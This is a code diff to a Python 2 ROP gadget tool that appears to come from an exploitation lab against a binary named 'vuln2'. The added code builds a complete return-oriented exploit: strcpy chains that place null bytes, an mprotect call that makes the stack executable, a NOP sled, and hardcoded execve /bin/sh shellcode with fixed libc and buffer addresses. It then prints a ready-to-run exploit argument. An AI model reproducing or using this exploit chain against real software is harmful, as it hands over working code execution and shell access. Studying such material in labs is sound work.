@@ -11,8 +11,6 @@ gadget_map = {}
 unique_gadget_map = {}
 disassembled_map = {}
 register_list = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp"]
-strcpy_offset = 0
-mprotect_offset = 0
 
 def find_gadgets(sectionData, startAddr):
     retCount = sectionData.count("\xc3")
@@ -88,47 +86,24 @@ def print_gadgets(gadgetMap):
             out_str += " ; "
         print out_str
 
-
-def is_forbidden_register(op_str, forbidden_reg_list):
-    for reg in forbidden_reg_list:
-        if op_str.count(reg) > 0:
-            return True
-    return False
-
-def find_pop_ret(gadgetMap, count, forbidden_reg_list):
+def find_pop2_ret(gadgetMap):
     for gadget_addr in gadgetMap:
         instr_list = gadgetMap[gadget_addr]
-        pop_count = 0
+        mnemonic_list = []
         for instr in instr_list:
-            if (instr.mnemonic != "pop") and (instr.mnemonic != "ret"):
-                break
-            if is_forbidden_register(instr.op_str, forbidden_reg_list) is True:
-                break
-            if instr.mnemonic == "pop":
-                pop_count += 1
-            if instr.mnemonic == "ret":
-                if pop_count == count:
-                    return gadget_addr
-                break
-
+            mnemonic_list.append(instr.mnemonic)
+        if mnemonic_list == ["pop", "pop", "ret"]:
+            return gadget_addr
     return 0
 
-def find_xor_zero(gadgetMap, forbidden_reg_list, allowed_reg_list):
+def find_pop3_ret(gadgetMap):
     for gadget_addr in gadgetMap:
         instr_list = gadgetMap[gadget_addr]
-        xorFound = False
+        mnemonic_list = []
         for instr in instr_list:
-            if (instr.mnemonic != "xor") and (instr.mnemonic != "ret"):
-                break
-            if is_forbidden_register(instr.op_str, forbidden_reg_list) is True:
-                break
-            if (instr.mnemonic == "xor"):
-                for reg in allowed_reg_list:
-                    if instr.op_str.count(reg) == 2:
-                        xorFound = True
-            if instr.mnemonic == "ret" and xorFound is True:
-                    return gadget_addr
-
+            mnemonic_list.append(instr.mnemonic)
+        if mnemonic_list == ["pop", "pop", "pop", "ret"]:
+            return gadget_addr
     return 0
 
 def get_function_address(elffile, symname):
@@ -141,6 +116,93 @@ def get_function_address(elffile, symname):
 
     return 0
 
+def find_null_byte(elffile):
+    rodata_section = elffile.get_section_by_name(b'.rodata')
+
+    startAddr = rodata_section.header['sh_addr']
+    val = rodata_section.data()
+       
+    found = False
+    for i in range(len(val)):
+        startAddr = startAddr + 1
+        if val[i] == '\x00':
+            found = True
+            break
+
+    if found is True:
+        return startAddr
+
+    return 0
+
+def pack_value(value):
+    packed_value = struct.pack("<I", value)
+    return packed_value
+
+def build_rop_chain_libc(elffile, libc_base_address, buf_address, buf_len, packed_shellcode):
+    mprotect_offset = get_function_address(elffile, "mprotect")
+    mprotect_addr = pack_value(libc_base_address + mprotect_offset)
+
+    strcpy_offset = get_function_address(elffile, "__strcpy_sse_2")
+    strcpy_addr = pack_value(0xb7e98a30)
+
+    null_byte_location = pack_value(libc_base_address + find_null_byte(elffile))
+
+    pop2_ret_offset = find_pop2_ret(disassembled_map)
+    pop2_addr = pack_value(libc_base_address + pop2_ret_offset)
+
+    pop3_ret_offset = find_pop3_ret(disassembled_map)
+    pop3_addr = pack_value(libc_base_address + pop3_ret_offset)
+    print hex(libc_base_address + pop3_ret_offset)
+    #pop3_addr = pack_value(0xb7efcaef)
+
+    memory_start_address = ((buf_address >> 12) << 12)
+    memory_length = 0x1000
+    permissions = 0x7
+
+    null_count = 0
+    mprotect_arguments = pack_value(memory_start_address) + pack_value(memory_length) + pack_value(permissions)
+
+    rop_payload = ""
+    rop_payload += mprotect_addr + pop3_addr + mprotect_arguments.replace("\x00", "\x7f") + pack_value(buf_address)
+
+    strcpy_dest_list = []
+    strcpy_dest = buf_address + buf_len + 4 + (7 * 16) + 8 + 0 - 0x10
+    strcpy_dest_list.append(strcpy_dest)
+    strcpy_dest_list.append(strcpy_dest + 4)
+    strcpy_dest_list.append(strcpy_dest + 6)
+    strcpy_dest_list.append(strcpy_dest + 7)
+    strcpy_dest_list.append(strcpy_dest + 9)
+    strcpy_dest_list.append(strcpy_dest + 0xa)
+    strcpy_dest_list.append(strcpy_dest + 0xb)
+
+    strcpy_chain = ""
+    for strcpy_da in strcpy_dest_list:
+        strcpy_chain += strcpy_addr + pop2_addr + pack_value(strcpy_da) + null_byte_location
+
+    rop_payload = strcpy_chain + rop_payload
+
+    ret_addr = strcpy_addr
+    nop_len = buf_len + 8 - len(packed_shellcode) - (len(ret_addr) * 10)
+    nop_sled = "\x90" * nop_len
+
+    rop_payload = nop_sled + packed_shellcode + 9 * ret_addr + rop_payload
+
+    return rop_payload
+
+def print_rop_payload(buf):
+    rows, columns = os.popen('stty size', 'r').read().split()
+    print "#"*int(columns)
+    print "Run the following command as the argument of vuln2 to reproduce this exploit.\n"
+    print "#"*int(columns)
+    bufstr = buf.encode("hex")
+    i = 0
+    exploit_str = ""
+    while i < len(bufstr) - 1:
+        exploit_str += "\\x" + bufstr[i] + bufstr[i+1]
+        i += 2
+    print "`python -c \'print \"" + exploit_str + "\"\'`"
+    print ""
+    print "#"*int(columns)
 
 def get_binary_instr(filename):
     with open(filename, 'rb') as f:
@@ -152,8 +214,6 @@ def get_binary_instr(filename):
             textStartAddr = textSec.header['sh_addr']
             textSection = textSec.data()
             find_gadgets(textSection, textStartAddr)
-            mprotect_offset = get_function_address(elffile, "mprotect")
-            strcpy_offset = get_function_address(elffile, "strcpy")
         else:
             initSec = elffile.get_section_by_name(b'.init')
             initStartAddr = initSec.header['sh_addr']
@@ -175,14 +235,16 @@ def get_binary_instr(filename):
             finiSection = finiSec.data()
             find_gadgets(finiSection, finiStartAddr)
 
-    build_disassembled_gadgets_map(unique_gadget_map)
-    print_gadgets(unique_gadget_map)
-    print str(len(unique_gadget_map)) + " unique gadgets found." 
+        build_disassembled_gadgets_map(unique_gadget_map)
+        print_gadgets(unique_gadget_map)
+        print str(len(unique_gadget_map)) + " unique gadgets found." 
+        libc_base_address = 0xb7e0d000
+        buf_address = 0xbfffeda8
+        buf_len = 256
+        packed_shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+        rop_payload = build_rop_chain_libc(elffile, libc_base_address, buf_address, buf_len, packed_shellcode)
+        print_rop_payload(rop_payload)
 
-    print "pop pop pop ret found at " + hex(find_pop_ret(disassembled_map, 3, []))
-    print "xor zero found at " + hex(find_xor_zero(disassembled_map, [], register_list))
-    print "mprotect found at " + hex(mprotect_offset)
-    print "strcpy found at " + hex(strcpy_offset)
 #/lib/ld-linux.so.2
 #mprotect-shellcode/vuln2
 #/lib/i386-linux-gnu/libc.so.6
